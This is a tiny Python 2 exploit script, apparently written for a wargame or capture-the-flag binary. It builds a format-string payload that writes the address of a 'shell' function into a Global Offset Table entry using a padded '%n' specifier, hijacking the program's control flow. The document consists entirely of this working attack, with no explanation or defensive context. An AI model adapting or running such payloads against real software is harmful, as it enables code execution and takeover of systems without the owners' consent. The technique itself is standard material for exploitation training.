import struct

shell = 0x80484a4
got = struct.pack("I", 0x8049838)

print got + " %134513824p%4$n"